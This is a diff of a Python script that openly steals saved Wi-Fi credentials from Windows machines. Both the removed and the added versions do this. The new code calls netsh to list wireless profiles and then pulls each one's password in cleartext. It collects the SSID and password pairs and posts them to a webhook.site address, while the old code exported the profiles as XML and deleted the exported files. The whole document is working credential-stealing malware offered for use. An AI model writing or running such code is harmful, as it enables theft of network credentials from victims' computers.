@@ -1,36 +1,44 @@
-from importlib.metadata import files
-import subprocess, os, sys, requests 
-import xml.etree.ElementTree as ET
+import subprocess, os, sys, requests, re, urllib
 
+# Replace with your webhook
+url = 'https://webhook.site/###################'
 
-#stealer URL
-url = 'https://webhook.site/your-key/' #replace this with your webhook url
+# Lists and regex
+found_ssids = []
+pwnd = []
+wlan_profile_regex = r"All User Profile\s+:\s(.*)$"
+wlan_key_regex = r"Key Content\s+:\s(.*)$"
 
-#Lists & Dicts
-wifi_files = []
-payload = {"SSID":[], "Password":[]}
+#Use Python to execute Windows command
+get_profiles_command = subprocess.run(["netsh", "wlan", "show", "profiles"], stdout=subprocess.PIPE).stdout.decode()
 
-#Use Python to execute a Window command
-command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output= True).stdout.decode()
+#Append found SSIDs to list
+matches = re.finditer(wlan_profile_regex, get_profiles_command, re.MULTILINE)
+for match in matches:
+    for group in match.groups():
+        found_ssids.append(group.strip())
 
-#Grab current directory
-path = os.getcwd()
+#Get cleartext password for found SSIDs and place into pwnd list
+for ssid in found_ssids:
+    get_keys_command = subprocess.run(["netsh", "wlan", "show", "profile", ("%s" % (ssid)), "key=clear"], stdout=subprocess.PIPE).stdout.decode()
+    matches = re.finditer(wlan_key_regex, get_keys_command, re.MULTILINE)
+    for match in matches:
+        for group in match.groups():
+            pwnd.append({
+                "SSID":ssid,
+                "Password":group.strip()
+                }) 
 
-#Append Wi-Fi XML files to wifi files list
-for filename in os.listdir(path):
-    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
-        wifi_files.append(filename)
+#Check if any pwnd Wi-Fi exists, if not exit
+if len(pwnd) == 0:
+    print("No Wi-Fi profiles found. Exiting...")
+    sys.exit()
 
-#Parse Wi-Fi XML files        
-for file in wifi_files:
-    tree = ET.parse(files)
-    root = tree.getroot()
-    SSID = root[0].text
-    password = root[4][0][1][2].text
-    payload["SSID"].append(SSID)
-    payload["Password"].append(password)
-    os.remove(file)
+print("Wi-Fi profiles found. Check your webhook...")
 
-#Send the hackies
-payload_str = " & ".join("%s=%s" % (k,v) for k,v in payload.items())
-r = requests.post(url, params='format=json', data=payload_str)
+#Send the hackies to your webhookz
+final_payload = ""
+for pwnd_ssid in pwnd:
+    final_payload += "[SSID:%s, Password:%s]\n" % (pwnd_ssid["SSID"], pwnd_ssid["Password"]) # Payload display format can be changed as desired
+
+r = requests.post(url, params="format=json", data=final_payload)
